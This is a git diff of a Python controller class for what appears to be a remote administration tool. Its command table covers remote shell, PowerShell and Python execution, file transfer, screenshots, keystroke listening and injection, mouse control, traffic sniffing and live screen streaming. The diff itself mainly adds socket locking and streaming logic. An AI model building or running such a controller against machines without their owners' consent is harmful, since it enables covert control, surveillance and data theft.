@@ -11,6 +11,7 @@ import keyboard
 import numpy as np
 
 Commend = Callable[[],bytes]
+
 RETURN = False
 # unneeded
 def cmd() -> bytes:
@@ -57,7 +58,7 @@ def receive_file() ->bytes:
         return b""
     return b"receive_file:"+file_path.encode()
 
-
+#unneeded
 def send_file(file_path:str,name:bytes) ->bytes:
     try:
         with open(file_path, "rb") as file:
@@ -83,9 +84,8 @@ def exit_endless_print():
 def listen_to_keys()->bytes:
     return b"listen_to_keys"
 
-def on_key_event(event):
-    print(f"Key '{event.name}' was {event.event_type}")
 
+#unneeded
 def live_stream() -> bytes:
     return b"live_stream"
 
@@ -93,6 +93,7 @@ def press_key_in_worker() -> bytes:
     global RETURN
     print("every key you press will be pressed in worker, enter ctrl+q to quit to menu")
     while True:
+
         event = keyboard.read_event()
         if event.event_type == "down":
             if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
@@ -165,6 +166,10 @@ class Master:
         self.client: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.functions: dict[str, Commend] = {"cmd": cmd, "powershell": powershell, "python":python, "send_file":send_file, "receive_file":receive_file, "screen_shot": screen_shot,"listen_to_keys":listen_to_keys, "press_key_in_worker":press_key_in_worker, "control_mouse":control_mouse, "sniff_from_worker":sniff_from_worker, "live_stream":live_stream}
         self.exit:bool = False
+        self.streaming = False
+        self._sock_lock = threading.RLock()
+        self.on_stream_stop = None
+        self.control_key = False
 
 
 
@@ -194,46 +199,82 @@ class Master:
 
     def sender(self,message:bytes):
         data = struct.pack("I",len(message))+message
-        self.client.send(data)
+        self.client.sendall(data)
+
+    def control_keys(self):
+        while True:
+            if self.control_key:
+                with self._sock_lock:
+                    self.sender(b"listen_to_keys")
+
+                event = keyboard.read_event()
+                if event.event_type == "down":
+                    if keyboard.is_pressed("ctrl") and keyboard.is_pressed("q"):
+                        self.control_key = False
+                        continue
+                    else:
+                        return b"press_key_in_worker:" + event.name.encode()
 
     def show_stream(self):
-        global RETURN
-        root = tkinter.Tk()
-        screen_width = root.winfo_screenwidth()
-        screen_height = root.winfo_screenheight()
-        root.destroy()
-        while True:
-            frame_data = self.receiver()
-            if not frame_data:
-                break
+            global RETURN
+            root = tkinter.Tk()
+            screen_width = root.winfo_screenwidth()
+            screen_height = root.winfo_screenheight()
+            root.destroy()
+            while True:
+                if self.streaming:
+                    with self._sock_lock:
+                        self.sender(b"live_stream")
+                        frame_data = self.receiver()
 
-            frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
-            if frame is None:
-                continue
+                    if not frame_data:
+                        time.sleep(0.05)
+                        continue
 
-            h, w, _ = frame.shape
-            scale = min(screen_width / w, screen_height / h)
-            new_w, new_h = int(w * scale), int(h * scale)
-            resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)
-            canvas = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
-            x_offset = (screen_width - new_w) // 2
-            y_offset = (screen_height - new_h) // 2
-            canvas[y_offset:y_offset + new_h, x_offset:x_offset + new_w] = resized
+                    frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
+                    if frame is None:
+                        time.sleep(0.005)
 
-            cv2.imshow("Live Stream", canvas)
+                        continue
 
-            key = cv2.waitKey(1)
+                    h, w, _ = frame.shape
+                    scale = min(screen_width / w, screen_height / h)
+                    new_w, new_h = int(w * scale), int(h * scale)
+                    resized = cv2.resize(frame, (new_w, new_h), interpolation=cv2.INTER_CUBIC)
+                    canvas = np.zeros((screen_height, screen_width, 3), dtype=np.uint8)
+                    x_offset = (screen_width - new_w) // 2
+                    y_offset = (screen_height - new_h) // 2
+                    canvas[y_offset:y_offset + new_h, x_offset:x_offset + new_w] = resized
 
-            if cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE) < 1:
-                print("Window closed, stopping video loop...")
-                break
+                    cv2.imshow("Live Stream", canvas)
 
-            if key == ord("q"):
-                print("Pressed 'q', stopping video loop...")
-                break
-            self.sender(b"live_stream")
-        RETURN = True
-        cv2.destroyAllWindows()
+                    key = cv2.waitKey(1)
+
+                    if cv2.getWindowProperty("Live Stream", cv2.WND_PROP_VISIBLE) < 1:
+                        print("Window closed, stopping video loop...")
+                        self.streaming = False
+                        if self.on_stream_stop:
+                            self.on_stream_stop()
+                        continue
+
+                    if key == ord("q"):
+                        print("Pressed 'q', stopping video loop...")
+                        self.streaming = False
+                        if self.on_stream_stop:
+                            self.on_stream_stop()
+                        continue
+                    time.sleep(0.001)
+
+                else:
+                    try:
+                        cv2.destroyWindow("Live Stream")
+                    except cv2.error:
+                        # window didn't exist → safe to ignore
+                        pass
+                    time.sleep(0.1)
+
+            RETURN = True
+            cv2.destroyAllWindows()
 
 
     def menu(self) ->str:
@@ -260,8 +301,9 @@ class Master:
             message = send_file(splitted[0],splitted[1].encode())
         if b"error:" in message:
             return message
-        self.sender(function.encode()+b":"+message)
-        received = self.receiver()
+        with self._sock_lock:
+            self.sender(function.encode() + b":" + message)
+            received = self.receiver()
         return received
 
     def run1(self,function:str,message:str):
